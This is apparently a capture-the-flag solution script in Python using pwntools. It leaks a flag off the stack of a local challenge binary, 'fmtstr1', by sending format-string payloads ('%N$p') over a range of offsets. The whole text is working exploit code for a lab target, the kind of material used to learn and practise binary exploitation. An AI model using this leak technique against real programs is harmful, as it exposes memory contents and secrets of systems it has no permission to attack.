from pwn import *

exe = ELF('fmtstr1', checksec = False)

output = b''
for i in range(12, 20):
    r = process(exe.path)
    r.sendafter(b'string:', f'%{i}$p')
    leak = int(r.recvall(), 16)
    output += p64(leak)
    if b'}' in output:
        print(output)
        exit(0)

r.interactive()
